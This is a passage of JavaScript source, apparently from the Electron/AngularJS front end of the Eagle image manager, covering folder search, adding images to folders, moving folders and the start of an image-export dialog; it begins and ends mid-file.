        var folderSearchItems = folders.map(folder => {
            var folderNameCN = chineseConvert.tw2cn(folder.name);
            if (keyword.length >= 30 || folder.name.length >= 30) {
                return {
                    folder: folder,
                    name: folderNameCN,
                    search: [folderNameCN]
                }
            }
            return {
                folder: folder,
                name: folderNameCN,
                search: [folderNameCN, ..._.uniq(
                    cartesianProduct(pinyinlite(folderNameCN, { keepUnrecognized : true }).filter(p => p.length > 0))
                    .map(item => item.join(' '))
                )],
            };
        });

        var scores = folderSearchItems.map(item => {
            var score = _.max(item.search.map(pinyin => pinyin.score(keyword_cn)));
            // if (score === 0) {
                var folder = item.folder;
                if (folder && folder.parent && $scope.folderMappings[folder.parent]) {
                    if ($scope.folderMappings[folder.parent].showChildren) {
                        score = 1;
                    }
                }
                if (folder.children) {
                    var isMatch = false;
                    eagle.utils.tree.walk(folder.children, 'children', function (child, parent) {
                        if (fuzzy_match(child.name, keyword_cn).length > 0) {
                            folder.isExpand = true;
                            isMatch = true;
                        }
                        if (child.pinyin && keyword_cn.length > 3) {
                            if (fuzzy_match(child.pinyin, keyword_cn).length > 0) {
                                folder.isExpand = true;
                                isMatch = true;
                            }
                        }
                    });
                    if (isMatch) {
                        score = 1;
                    }
                }
            // }
            return {
                item: item,
                name: item.name,
                score: score
            };
        })

        // var result = scores.filter(i => i.score > 0).sort((a, b) => b.score - a.score).map(function (i) {
        var result = scores.filter(i => i.score > 0).map(function (i) {
            return i.item.folder;
        });

        return result;
    }

    $scope.folderMoveSearchFilter = function(folder) {

        var result = false;
        var pinyinMatch = false;
        if (!$scope.filterFolderKeyword) {
            return true;
        }
        if (folder) {
            // NOTE: 如果老爸有著无敌星星，那我就能直接显示
            if (folder.parent && $scope.folderMappings[folder.parent]) {
                if ($scope.folderMappings[folder.parent].showChildren) {
                    return true;
                }
            }
            var match = fuzzy_match(folder.name, $scope.filterFolderKeyword);
            result = match && match.length > 0;
            if (result) {
                return true;
            }
            var keyword_cn = chineseConvert.tw2cn($scope.filterFolderKeyword);
            var keyword_tw = chineseConvert.cn2tw($scope.filterFolderKeyword);
            if (keyword_cn !== keyword_tw) {
                result = fuzzy_match(folder.name, keyword_cn).length > 0;
                if (result) { return true; }

                result = fuzzy_match(folder.name, keyword_tw).length > 0;
                if (result) { return true; }
            }

            if (folder.pinyin && $scope.filterFolderKeyword.length >= 2) {
                pinyinMatch = fuzzy_match(folder.pinyin, $scope.filterFolderKeyword).length > 0;
            }
            if (pinyinMatch) {
                return true;
            }
            if (folder.children) {
                var isMatch = false;
                eagle.utils.tree.walk(folder.children, 'children', function (child, parent) {
                    if (fuzzy_match(child.name, $scope.filterFolderKeyword).length > 0) {
                        folder.isExpand = true;
                        isMatch = true;
                        return;
                    }
                    if (child.pinyin && $scope.filterFolderKeyword.length > 3) {
                        if (fuzzy_match(child.pinyin, $scope.filterFolderKeyword).length > 0) {
                            folder.isExpand = true;
                            isMatch = true;
                            return;
                        }
                    }
                });
                return isMatch;
            }
        }
        return false;
    };

    $scope.hoverFolder = function (folder) {
        $scope.searchScrollEnable = false;
        $scope.selectedFolder = folder;
    };

    $scope.select = function(folder) {
        if (folder && folder.vstype === 'createFolder') {
            $scope.createFolder();
        }
        else {
            if (!$scope.selectedFolders[folder.id]) {
                $scope.selectedFolders[folder.id] = true;
            }
            else {
                delete $scope.selectedFolders[folder.id];
            }
        } 
        $scope.focusSeach();
    };

    $scope.focusSeach = function () {
        $("#add-to-folder-search").focus();
    };

    $scope.createFolder = function () {

        var newFolder = {
            id: guid(),
            name: $scope.filterFolderKeyword,
            folders: [],
            modificationTime: Date.now(),
            editable: false,
            tags: [],
            children: [],
            isExpand: true,
        };

        $scope.selectedFolders[newFolder.id] = true;

        if ($scope.filterFolderKeyword && $scope.showCreateButton) {
            $scope.folders.unshift(newFolder);
            $scope.filterFolderKeyword = "";
            $scope.renderFolderList();
            ipcRenderer.send('prepend-folder', newFolder);
        }
    };

    $scope.hasSelected = function() {
        if (!$scope.isOpen) return;
        return Object.keys($scope.selectedFolders).length > 0;
    };

    $scope.newFolder = function (event) {
        event.stopPropagation();
        var idx = 0;
        createFolder(function (folderName) {
            if (folderName === undefined) return;
            var folderId = guid();
            var newFolder = {
                id: folderId,
                name: folderName,
                images: [],
                folders: [],
                modificationTime: Date.now(),
                imagesMappings: {},
                tags: [],
                children: [],
                isExpand: true,
            };
            var newFolderCopy = angular.copy(newFolder);

            $scope.folders.splice(idx, 0, newFolder);
            $bodyScope.folders.splice(idx, 0, newFolderCopy);
            $scope.folderMappings[newFolder.id] = newFolder;
            $bodyScope.folderMappings[newFolder.id] = newFolderCopy;

            $scope.renderFolderList();
            $bodyScope.updateSidebarList();
            $bodyScope.saveFolder();
            $scope.focusSeach();
        });
    };

    $scope.removeRecentFolder = function (event, folder) {
        if (recentMoveFolders && recentMoveFolders.length > 0) {
        let idx = recentMoveFolders.indexOf(folder.id);
            if (idx > -1) {
                let sidx = $scope.recentMoveFolders.indexOf(folder.id);
                if (sidx > -1) {
                    $scope.recentMoveFolders.splice(sidx, 1);
                }
                recentMoveFolders.splice(idx, 1);
                localStorage.setItem("recentMoveFolders", JSON.stringify(recentMoveFolders));
                $scope.renderFolderList();
            }
        }
    };

    $scope.moreButtonClick = function (event, folder) {

        event.stopPropagation();

        var contextMenu = new Menu();
        var newSubFolderItem = new MenuItem({
            label: $filter('i18n')("context.addToFolder.addChilderFolder"),
            click: function() {
                createFolder(function (folderName) {
                    if (folderName === undefined) return;
                    var folderId = guid();
                    var newFolder = {
                        id: folderId,
                        name: folderName,
                        images: [],
                        folders: [],
                        modificationTime: Date.now(),
                        imagesMappings: {},
                        tags: [],
                        children: [],
                        isExpand: true,
                        parent: folder.id
                    };
                    var newFolderCopy = angular.copy(newFolder);

                    var idx = 0;
                    var bodyFolder = $bodyScope.folderMappings[folder.id];
                    if (!folder.children) folder.children = [];
                    if (!bodyFolder.children) bodyFolder.children = [];

                    folder.children.splice(folder.children.length, 0, newFolder);
                    bodyFolder.children.splice(folder.children.length, 0, newFolderCopy);
                    $scope.folderMappings[newFolder.id] = newFolder;
                    $bodyScope.folderMappings[newFolder.id] = newFolderCopy;

                    folder.isExpand = true;

                    $scope.renderFolderList();
                    $bodyScope.updateSidebarList();
                    $bodyScope.saveFolder();
                    $scope.focusSeach();
                });
            }
        });
        var newSiblingsItem = new MenuItem({
            label: $filter('i18n')("context.addToFolder.addSiblingFolder"),
            click: function() {
                createFolder(function (folderName) {
                    if (folderName === undefined) return;

                    var folderId = guid();
                    var idx = 0;
                    var bodyFolder = $bodyScope.folderMappings[folder.id];
                    var parentId = folder.parent;
                    var parentFolderChildren;
                    var bodyParentFolderChildren;

                    if (!parentId) {
                        parentFolderChildren = $scope.folders;
                        bodyParentFolderChildren = $bodyScope.folders;
                    }
                    else {
                        if (!$scope.folderMappings[parentId]) return;
                        if (!$bodyScope.folderMappings[parentId]) return;
                        parentFolderChildren = $scope.folderMappings[parentId].children;
                        bodyParentFolderChildren = $bodyScope.folderMappings[parentId].children;
                    }

                    var idx = parentFolderChildren.indexOf(folder);
                    if (idx === -1) return;

                    var newFolder = {
                        id: folderId,
                        name: folderName,
                        images: [],
                        folders: [],
                        modificationTime: Date.now(),
                        imagesMappings: {},
                        tags: [],
                        children: [],
                        isExpand: true,
                        parent: parentId
                    };
                    var newFolderCopy = angular.copy(newFolder);

                    parentFolderChildren.splice(idx + 1, 0, newFolder);
                    bodyParentFolderChildren.splice(idx + 1, 0, newFolderCopy);
                    $scope.folderMappings[newFolder.id] = newFolder;
                    $bodyScope.folderMappings[newFolder.id] = newFolderCopy;

                    $scope.renderFolderList();
                    $bodyScope.updateSidebarList();
                    $bodyScope.saveFolder();
                    $scope.focusSeach();
                });
            }
        });

        contextMenu.append(newSubFolderItem);
        contextMenu.append(newSiblingsItem);
        contextMenu.popup(currentWindow);
        setTimeout(function () {
            $scope.focusSeach();
        }, 50);
    };

    function createFolder (callback) {
        swal({
            html: `
                <div class="alert">
                    <div class="alert-icon create"></div>
                    <h4 class="alert-title">${$filter('i18n')("dialog.addToFolder.craeateFolder.title")}</h4>
                </div>
            `,
            showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
            width: 400,
            customClass: "alert-box",
            input: 'text',
            inputPlaceholder: $filter('i18n')("dialog.addToFolder.craeateFolder.placeholder"),
            inputValue: '',
            cancelButtonColor: "#777777",
            confirmButtonText: $filter('i18n')("dialog.addToFolder.craeateFolder.button"),
            cancelButtonText: $filter('i18n')("general.cancel"),
        }).then(function (result) {
            var name = result
            callback(name);
            $scope.focusSeach();
        }, function () {
            $scope.focusSeach();
        });
    };

    $scope.save = function() {

        var ipcRenderer = require('electron').ipcRenderer;
        var selectedFolders = [];

        var origin = [];
        var originFolders = [];
        var originTags = [];
        var originDeleted = [];

        $scope.images.forEach(function(image) {
            origin.push(image);
            originFolders.push(angular.copy(image.folders));
            originTags.push(angular.copy(image.tags));
            originDeleted.push(image.isDeleted);
        });

        // 如果使用者取消打勾既有分类文件夹
        var removedFolderIds = [];
        $scope.existsFolders.forEach(function (exFolderId) {
            if (!$scope.selectedFolders[exFolderId]) {
                removedFolderIds.push(exFolderId);
            }
        });

        var hasChanged = false;
        var hasRemoved = false;
        eagle.utils.tree.walk($scope.folders, 'children', function (folder, parent) {
            if ($scope.selectedFolders[folder.id]) {

                // 添加至最近使用文件夹
                var recentIdx = recentMoveFolders.indexOf(folder.id);
                if (recentIdx !== -1) {
                    recentMoveFolders.splice(recentIdx, 1);
                }
                recentMoveFolders.unshift(folder.id);

                selectedFolders.push(folder);
                $scope.images.forEach(function(image) {
                    if (image.folders.indexOf(folder.id) === -1) {
                        image.folders.push(folder.id);
                        if (folder.extendTags) {
                            folder.extendTags.forEach(function(tag) {
                                if (image.tags.indexOf(tag) === -1) {
                                    image.tags.push(tag);
                                }
                            });
                        }
                    }
                    if ($scope.current && $scope.isRemoveFromOriginal == 'true') {
                        var idx = image.folders.indexOf($scope.current.id);
                        if (idx !== -1) {
                            ig.remove($("#box-" + image.id)[0]);
                            image.folders.splice(idx, 1);
                            $scope.updateFilterCounts(image, true);
                            $scope.current.imagesMappings[image.id] = false;
                            hasRemoved = true;
                        }
                    }

                    // 如果使用者取消打勾既有分类文件夹
                    if (removedFolderIds && removedFolderIds.length > 0) {
                        removedFolderIds.forEach(function (removedFolderId) {
                            var idx = image.folders.indexOf(removedFolderId);
                            if (idx !== -1) {
                                if ($scope.current && $scope.current.id === removedFolderId) {
                                    ig.remove($("#box-" + image.id)[0]);
                                    $scope.current.imagesMappings[image.id] = false;
                                }
                                image.folders.splice(idx, 1);
                                $scope.updateFilterCounts(image, true);
                                hasRemoved = true;
                            }
                        });
                    }

                    image.isDeleted = false;
                });
                hasChanged = true;
            }
        });

        if (hasRemoved) {
            $bodyScope.lastIndex = $bodyScope.getSelection().start;

            // 自動選取下一個圖片，如果沒有下一個，選上一個，都沒有就空
            var next = $bodyScope.allData[$bodyScope.lastIndex + $bodyScope.selected.length];
            var prev = $bodyScope.allData[$bodyScope.lastIndex - 1];
            if (next) {
                $bodyScope.selected = [next];
                $bodyScope.current = next;
                $bodyScope.smartZoom();
            }
            else if (prev) {
                $bodyScope.selected = [prev];
                $bodyScope.current = prev;
                $bodyScope.smartZoom();
            }
            else {
                $bodyScope.selected = [];
                $bodyScope.leaveDetailMode();
            }
        }

        if (hasChanged) {
            ayncsImagesChange($scope.images);
            hiddenByCurrentFilter($scope.images);
        }

        if ($scope.viewMode === 'unfiled') {
            var itemElements = $scope.getSelectedItemElements();
            $rootScope.$broadcast("gl:removeItems", itemElements);
        }
        else {
            ig.layout(false);
        }

        $rootScope.$broadcast("CALCULATE_IMAGE_BINDING");
        $rootScope.$broadcast("REBIND_REFRESH", true);
        $rootScope.$broadcast("UPDATE_SELECTION");

        // 记录最近使用的文件夹
        recentMoveFolders = recentMoveFolders.slice(0, 50);
        localStorage.setItem("recentMoveFolders", JSON.stringify(recentMoveFolders));

        var message = $filter('i18n')("notify.image.moveToFolders", [
            { "property": "imageCount", "value": $scope.images.length },
            { "property": "folderCount", "value": selectedFolders.length }
        ]);
        if ($scope.images.length === 1) { message = message.replace("images", "image"); }
        if (selectedFolders.length === 1) { 
            // message = message.replace(" folders", ""); 
            message = angular.element(document.body).injector().get('$filter')('i18n')("notify.image.moveToFolder", [
                { "property": "folderId", "value": selectedFolders[0].id },
                { "property": "imageCount", "value": $scope.images.length },
                { "property": "folderName", "value": selectedFolders[0].name }
            ]);
        }

        // 復原操作
        $rootScope.notify({
            message: message,
            duration: 4000,
        }, function () {
            origin.forEach(function (image, index) {
                image.folders = originFolders[index];
                image.tags = originTags[index];
                image.isDeleted = originDeleted[index];
            });
            $scope.selected = origin;
            $scope.current = origin[0];
            $rootScope.$broadcast("CALCULATE_IMAGE_BINDING");
            $rootScope.$broadcast("REBIND_REFRESH", true);
            $rootScope.$broadcast("UPDATE_SELECTION");
        });

        $scope.isOpen = false;
        $(".move-to-folder-modal input:focus").blur();
        $scope.scrollToTop();

        electronLog && electronLog.info(`[app] Categorize ${$scope.images.length} files to ${selectedFolders.length} folders`);
        analytics.event('File', 'Categorize', 'AddToFolder');
    };

    $scope.cancel = function() {
        $scope.isOpen = false;
        $(".move-to-folder-modal input:focus").blur();
        $scope.scrollToTop();
    };

});
EagleApp.controller("MoveFolderController", function($scope, $timeout, $rootScope, $filter) {

    $scope.isOpen = false;
    $scope.currentIndex;
    $scope.showCreateButton = false;
    $scope.filterFolderKeyword = "";
    $scope.folders = [];
    $scope.resultList = [];
    $scope.folderMappings = {};
    $scope.selectedFoldersMappings = {};

    var $bodyScope = angular.element("body").scope();

    var watchers = {
        openModal: function(e, params) {
            $scope.images = params.images;
            $scope.current = params.current;
            $scope.existsFolders = params.existsFolders;
            $scope.folders = [];

            $scope.selectedFoldersMappings = {};
            $scope.selectedFolders = params.selectedFolders;
            $scope.selectedFolders.forEach(function (f) {
            	$scope.selectedFoldersMappings[f.id] = true;
            });

            // 與外界隔離，不需要使用 body scope 的 folders
            cloneTree($scope.folders, params.folders, true);

            eagle.utils.tree.walk($scope.folders, 'children', function (folder, parent) {
                $scope.folderMappings[folder.id] = folder;
                if (folder && parent) {
                    folder.parent = parent.id;
                }
            });

            // $scope.filterFolderKeyword = "";
            $scope.renderFolderList();
            $scope.selectedFolder = $scope.resultList[0];
            
            $timeout(function () {
                $scope.isOpen = true;
            }, 70);
        }
    };

    $scope.$on("OPEN-MOVE-FOLDER-MODAL", watchers.openModal);
    $scope.$watch("isRemoveFromOriginal", function (newValue) {
        localStorage.setItem("isRemoveFromOriginal", newValue);
    });
    
    function getFolderList () {

        let list = [];
        let isFiltering = !!$scope.filterFolderKeyword;
        let guidelinesMap = {};
        
        eagle.utils.tree.walk($scope.folders, 'children', function (folder, parent, depth) {

            // 計算 guidelines 顏色及數量
            let guidelines = [];
            if (parent && guidelinesMap[parent.id]) {
                const parentGuidelines = guidelinesMap[parent.id];
                guidelines = [...parentGuidelines, folder.iconColor || 'normal'];
            }
            else {
                guidelines = [folder.iconColor || 'normal'];
            }
            guidelinesMap[folder.id] = guidelines;

            var idx;
            folder.size = 27;
            folder.vstype = 'folder';
            folder.guidelines = guidelines.slice(0, guidelines.length - 1);
            folder.styles = {
                depth: depth,
                first: false,
                last: false
            };

            if ($scope.selectedFoldersMappings[folder.id]) {
                folder.isVisible = false;
            }
            else if (parent) {
                folder.isVisible = folder.isExpand && parent.isVisible && !$scope.selectedFoldersMappings[parent.id];
            }
            else {
            	folder.isVisible = folder.isExpand;
            }

            if (depth !== 0 && parent && parent.children) {
                idx = parent.children.indexOf(folder);
                if (idx === 0 && parent.children.length > 1) {
                    folder.styles.first = true;
                    folder.styles.last = false;
                }
                else if (idx === 0 && parent.children.length === 1) {
                    folder.styles.first = false;
                    folder.styles.last = true;
                }
                else if (idx === parent.children.length - 1) {
                    folder.styles.first = false;
                    folder.styles.last = true;
                }
                else {
                    folder.styles.first = false;
                    folder.styles.last = false;
                }
            }
            if (folder && folder.isExpand && folder.children.length > 0) {
                folder.styles.last = true;
            }

            // 决定是否要在画面上显示
            if (!parent) {
                list.push(folder);
            }
            else if (isFiltering) {
                list.push(folder);
            }
            else {
                if (folder && parent.isVisible) {
                    list.push(folder);
                }
            }
        });
        return list;
    };

    $scope.renderFolderList = function () {

        var list = [];
        var folderList = getFolderList();
        var folderLabel = { vstype: 'label-folder', size: 25 };
        var createFolderItem = { vstype: 'createFolder', size: 28 };

        folderList = $filter('filter')(folderList, $scope.folderMoveSearchFilter);

        if ($scope.filterFolderKeyword.length <= 0) {
            list.push({ vstype: 'separator', size: 8 });
            list.push(folderLabel);
        }
        else {
            list.push({ vstype: 'separator', size: 8 });
        }
        
        list = list.concat(folderList);


        // 计算是否需要显示创建按钮
        $scope.showCreateButton = false;
        if ($scope.filterFolderKeyword) {
            $scope.showCreateButton = true;
            for (var i = 0; i < list.length; i++) {
                var folder = list[i];
                if (folder.name === $scope.filterFolderKeyword) {
                    $scope.showCreateButton = false;
                    break;
                }
            }
        }

        if ($scope.showCreateButton) {
            list.push(createFolderItem);
        }
        
        $scope.resultList = list;
    };

    $scope.folderMoveSearchFilter = function(folder) {

        var result = false;
        var pinyinMatch = false;
        if (!$scope.filterFolderKeyword) {
            return true;
        }
        if (folder) {
            // NOTE: 如果老爸有著无敌星星，那我就能直接显示
            if (folder.parent && $scope.folderMappings[folder.parent]) {
                if ($scope.folderMappings[folder.parent].showChildren) {
                    return true;
                }
            }
            var match = fuzzy_match(folder.name, $scope.filterFolderKeyword);
            result = match && match.length > 0;
            if (result) {
                return true;
            }
            var keyword_cn = chineseConvert.tw2cn($scope.filterFolderKeyword);
            var keyword_tw = chineseConvert.cn2tw($scope.filterFolderKeyword);
            if (keyword_cn !== keyword_tw) {
                result = fuzzy_match(folder.name, keyword_cn).length > 0;
                if (result) { return true; }

                result = fuzzy_match(folder.name, keyword_tw).length > 0;
                if (result) { return true; }
            }

            if (folder.pinyin && $scope.filterFolderKeyword.length >= 2) {
                pinyinMatch = fuzzy_match(folder.pinyin, $scope.filterFolderKeyword).length > 0;
            }
            if (pinyinMatch) {
                return true;
            }
            if (folder.children) {
                var isMatch = false;
                eagle.utils.tree.walk(folder.children, 'children', function (child, parent) {
                    if (fuzzy_match(child.name, $scope.filterFolderKeyword).length > 0) {
                        folder.isExpand = true;
                        isMatch = true;
                        return;
                    }
                    if (child.pinyin && $scope.filterFolderKeyword.length > 3) {
                        if (fuzzy_match(child.pinyin, $scope.filterFolderKeyword).length > 0) {
                            folder.isExpand = true;
                            isMatch = true;
                            return;
                        }
                    }
                });
                return isMatch;
            }
        }
        return false;
    };

    $scope.getMoveFolderItemClass = function (node, folderName, selectedFolder) {
        var result = {
            'hover active-item': node == selectedFolder,
            'collapsed': !node.isExpand && !$scope.filterFolderKeyword,
            'empty-node': node.children && node.children.length == 0,
            'color-red': node.iconColor == 'red',
            'color-orange': node.iconColor == 'orange',
            'color-yellow': node.iconColor == 'yellow',
            'color-green': node.iconColor == 'green',
            'color-aqua': node.iconColor == 'aqua',
            'color-blue': node.iconColor == 'blue',
            'color-purple': node.iconColor == 'purple',
            'color-pink': node.iconColor == 'pink',
            'close': node.children && node.children.length <= 0 && node.isExpand,
            'disabled': !!$scope.selectedFoldersMappings[node.id]
        };

        result['icon-' + node.icon] = true;
        return result;
    };

    $scope.toggleFolder = function (event, folder) {
        event.stopPropagation();
        if ($scope.filterFolderKeyword) {
            folder.isExpand = !folder.isExpand;
            folder.showChildren = !folder.showChildren;
        }
        else {

        	// 如果用户点击了 ⌘ + alt，展开/收起所有层级
            if (event.altKey && (event.metaKey || event.ctrlKey)) {
                var expand = !folder.isExpand;
                toggleAllFolders($scope.folders, expand);
            }
            // 如果用户点击 ⌘，展开/收起第一层
            else if (event.metaKey || event.ctrlKey) {
                var expand = !folder.isExpand;
                var parent = $scope.folderMappings[folder.parent];
                var folders = $scope.folders;
                if (parent && parent.children) {
                    folders = parent.children;
                }
                toggleCurrentLevelFolders(folders, expand);
            }
            else if (event.altKey) {
                var expand = !folder.isExpand;
                var folders = folder.children;
                folder.isExpand = expand;
                toggleCurrentLevelFolders(folders, expand);
            }
            else {
                folder.isExpand = !folder.isExpand;
            }
        }
        $scope.renderFolderList();
        $scope.focusSeach();
    };

    function toggleAllFolders (folders, isExpand) {
        eagle.utils.tree.walk(folders, 'children', function(f, parent) {
            if (f.isExpand !== isExpand) {
                f.isExpand = isExpand;
            }
        });
    };

    function toggleCurrentLevelFolders (folders, isExpand) {
        folders.forEach(function (f) {
            if (f.isExpand !== isExpand) {
                f.isExpand = isExpand;
            }
        });
    };

    $scope.keywordChange = function () {

        // 一律清除強制展開的功能
        eagle.utils.tree.walk($scope.folders, 'children', function (folder, parent) {
            delete folder.showChildren;
        });
        
        $scope.renderFolderList();
        $scope.selectedFolder = $scope.resultList[0];
        $scope.scrollToTop();
    };

    $scope.onSearchKeyup = function(event) {
        var keyCode = event.keyCode;
        if (keyCode === 27) {
            $scope.cancel();
        }
    };

    $scope.scrollToTop = function () {
        $(".move-to-folder-modal .sidebar-item-container").scrollTop(0);
    };

    $scope.focusSeach = function () {
        $("#move-folder-search").focus();
    };

    
    // 两种文案撰写方式
    // 1 > 1
    // N > 1
    $scope.moveToFolderTop = function (node) {

        var msg;
        if ($scope.selectedFolders.length === 1) {
            msg = $filter('i18n')("dialog.moveFolder.descTop", [
                { "property": "first", "value": $scope.selectedFolders[0].name },
                { "property": "target", "value": node.name },
            ]);
        }
        else {
            msg = $filter('i18n')("dialog.moveFolder.descTopMultiple", [
                { "property": "first", "value": $scope.selectedFolders[0].name },
                { "property": "count", "value": $scope.selectedFolders.length - 1 },
                { "property": "target", "value": node.name },
            ]);
        }
    	
    	swal({
            html: `
                <div class="alert">
                    <div class="alert-icon warning"></div>
                    <h4 class="alert-title">${i18n.__("dialog.moveFolder.title")}</h4>
                    <p class="alert-desc">${msg}</p>
                </div>
            `,
            showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
            width: 400,
            customClass: "alert-box",
            cancelButtonColor: "#777777",
            confirmButtonText: $filter('i18n')('dialog.moveFolder.button'),
            cancelButtonText: $filter('i18n')("general.cancel"),
            onOpen: () => {
                $("#move-folder-search").blur();
                var button = swal.getConfirmButton();
                if (button) {
                    $(button).focus();
                }
            }
        }).then(function () {
        	var folder = $bodyScope.folderMappings[node.id];
        	$scope.focusSeach();
        	if (folder) {
                $bodyScope.moveFoldersAsSibling($scope.selectedFolders, folder);
                $scope.cancel();
                $bodyScope.$evalAsync();
            }
        }, function () {
        	$scope.focusSeach();
        });
    };

    $scope.moveToFolderInner = function (node) {

    	var msg;
        if ($scope.selectedFolders.length === 1) {
            msg = $filter('i18n')("dialog.moveFolder.descInner", [
                { "property": "first", "value": $scope.selectedFolders[0].name },
                { "property": "target", "value": node.name },
            ]);
        }
        else {
            msg = $filter('i18n')("dialog.moveFolder.descInnerMultiple", [
                { "property": "first", "value": $scope.selectedFolders[0].name },
                { "property": "count", "value": $scope.selectedFolders.length - 1 },
                { "property": "target", "value": node.name },
            ]);
        }

    	swal({
            html: `
                <div class="alert">
                    <div class="alert-icon warning"></div>
                    <h4 class="alert-title">${i18n.__("dialog.moveFolder.title")}</h4>
                    <p class="alert-desc">${msg}</p>
                </div>
            `,
            showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
            width: 400,
            customClass: "alert-box",
            cancelButtonColor: "#777777",
            confirmButtonText: $filter('i18n')('dialog.moveFolder.button'),
            cancelButtonText: $filter('i18n')("general.cancel"),
            onOpen: () => {
                $("#move-folder-search").blur();
                var button = swal.getConfirmButton();
                if (button) {
                    $(button).focus();
                }
            }
        }).then(function () {
        	var folder = $bodyScope.folderMappings[node.id];
            if (folder) {
                $bodyScope.moveFoldersToFolder($scope.selectedFolders, folder);
                $scope.cancel();
                $bodyScope.$evalAsync();
            }
        	$scope.focusSeach();
        }, function () {
        	$scope.focusSeach();
        });
    };

    $scope.moveToFolderBottom = function (node) {

    	var msg;
        if ($scope.selectedFolders.length === 1) {
            msg = $filter('i18n')("dialog.moveFolder.descBottom", [
                { "property": "first", "value": $scope.selectedFolders[0].name },
                { "property": "target", "value": node.name },
            ]);
        }
        else {
            msg = $filter('i18n')("dialog.moveFolder.descBottomMultiple", [
                { "property": "first", "value": $scope.selectedFolders[0].name },
                { "property": "count", "value": $scope.selectedFolders.length - 1 },
                { "property": "target", "value": node.name },
            ]);
        }

    	swal({
            html: `
                <div class="alert">
                    <div class="alert-icon warning"></div>
                    <h4 class="alert-title">${i18n.__("dialog.moveFolder.title")}</h4>
                    <p class="alert-desc">${msg}</p>
                </div>
            `,
            showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
            width: 400,
            customClass: "alert-box",
            cancelButtonColor: "#777777",
            confirmButtonText: $filter('i18n')('dialog.moveFolder.button'),
            cancelButtonText: $filter('i18n')("general.cancel"),
            onOpen: () => {
                $("#move-folder-search").blur();
                var button = swal.getConfirmButton();
                if (button) {
                    $(button).focus();
                }
            }
        }).then(function () {
        	$scope.focusSeach();
        	var folder = $bodyScope.folderMappings[node.id];
        	if (folder) {
                $bodyScope.moveFoldersAsSibling($scope.selectedFolders, folder, true);
                $scope.cancel();
                $bodyScope.$evalAsync();
            }
        }, function () {
        	$scope.focusSeach();
        });
    };

    $scope.save = function() {
        var ipcRenderer = require('electron').ipcRenderer;
        $scope.isOpen = false;
    };

    $scope.cancel = function() {
        $scope.isOpen = false;
        $(".move-to-folder-modal input:focus").blur();
        // $scope.scrollToTop();
    };

});

EagleApp.controller("ExportImageModalController", function($scope, $timeout, $rootScope, $filter) {

    const SUPPORT_FORMATS = { "jpg": true, "jpeg": true, "jfif": true, "jpe": true, "png": true, "gif": true, "webp": true, "bmp": true, "svg": true };

    $scope.exportImageScope = $scope;
    $scope.isOpen = false;
    $scope.items = [];

    $scope.isExporting = false;
    $scope.isCancelled = false;
    $scope.curr = 0;
    $scope.total = 0;

    $scope.format = "jpg";
    $scope.quality = "100";
    $scope.resizeMethod = "max-width";
    $scope.renameMethod = "original";
    $scope.pixel = 900;

    $scope.newName = `${i18n.__('general.untitled.newName')} `;
    $scope.startAt = 1;

    if (localStorage.getItem("EXPORT_IMAGE_LAST_FORMAT")) {
        $scope.format = localStorage.getItem("EXPORT_IMAGE_LAST_FORMAT");
    }

    if (localStorage.getItem("EXPORT_IMAGE_LAST_SIZE")) {
        $scope.pixel = parseInt(localStorage.getItem("EXPORT_IMAGE_LAST_SIZE"));
    }

    if (localStorage.getItem("EXPORT_IMAGE_LAST_METHOD")) {
        $scope.resizeMethod = localStorage.getItem("EXPORT_IMAGE_LAST_METHOD");
    }

    if (localStorage.getItem("EXPORT_IMAGE_LAST_QUALITY")) {
        $scope.quality = localStorage.getItem("EXPORT_IMAGE_LAST_QUALITY");
    }

    if (localStorage.getItem("EXPORT_IMAGE_LAST_RENAME_METHOD")) {
        $scope.renameMethod = localStorage.getItem("EXPORT_IMAGE_LAST_RENAME_METHOD");
    }

    if (localStorage.getItem("EXPORT_IMAGE_LAST_RENAME")) {
        $scope.newName = localStorage.getItem("EXPORT_IMAGE_LAST_RENAME");
    }

    $scope.$on("EXPORT_IMAGE", function(e, params) {
        $scope.isCancelled = false;
    	if (params.images && params.images.length > 0) {
            var items = params.images.filter(function (image) {
                var ext = image.ext && image.ext.toLowerCase();
                return SUPPORT_FORMATS[ext];
            })
            if (items.length === 0) return;
	    	$scope.items = items;
            $scope.curr = 0;
            $scope.total = items.length;
	        $scope.isOpen = true;
            updatePreview();
            setTimeout(function () {
                $scope.focusShourtcut();
            }, 200);
        }
    });

    function openDialog (callback) {
        dialog.showOpenDialog(currentWindow, {
            title: $filter('i18n')('dialog.exportAsFolder.title'),
            filters: [],
            properties: ['openDirectory', 'createDirectory'],
            buttonLabel: $filter('i18n')("dialog.exportAsFolder.botton")
        }).then(result => {
            var paths = result.filePaths;
            if (paths && paths[0]) {
                var savePath = paths[0];
                callback(savePath)
            }
            else {
                callback(undefined);
            }
            $scope.focusShourtcut();
        });
    }

    $scope.export = function() {
        if ($scope.isExporting) return;

        var format = $scope.format;
        var quality = parseInt($scope.quality) || 100;
        var resizeMethod = $scope.resizeMethod;
        var pixel = $scope.pixel;

        if ($scope.renameMethod !== 'original' && $scope.newName === "") {
            return;
        }

        // debugger


        // return;
        openDialog(function (savePath) {
            if (!savePath) return;

            if (!ACCESS.safeAccessSync(savePath)) {
                ipcRenderer.send("close-export-task");
                ipcRenderer.send('electron-log', `[bg] Export folder fail, because path no permission[access]: ${savePath}`);
                ACCESS.showReadOnlyDialog(savePath);
                return;
            }

            if (!ACCESS.checkALCs(savePath)) {
                ipcRenderer.send("close-export-task");
                ipcRenderer.send('electron-log', `[bg] Export folder fail, because path no permission[acl]: ${savePath}`);
                ACCESS.showALCDialog(savePath);
                return;
            }

            const async = require('async');
            $scope.close();
            $scope.isExporting = true;

            var finishOpenPath;
            var fileNameCount = {};
            var cbs = $scope.items.map(function(item, index) {
                return function(callback) {

                    var rawPath = $bodyScope.getRawUrl(item);
                    var image = new Image();
                    var outputPath;
                    var fileName = item.name;
                    var finishCallback = function (param1, param2) {
                        $scope.curr++;
                        $scope.$evalAsync();
                        setTimeout(() => {
                            callback(param1, param2);
                        }, 10);
                    }

                    if ($scope.isCancelled) {
                        finishCallback(undefined);
                        return;
                    }

                    if ($scope.renameMethod !== 'original') {
                        fileName = formatFileName($scope.newName, {
                            idx: $scope.startAt + index
                        });
                    }

                    // 避免重复名称文件无法输出
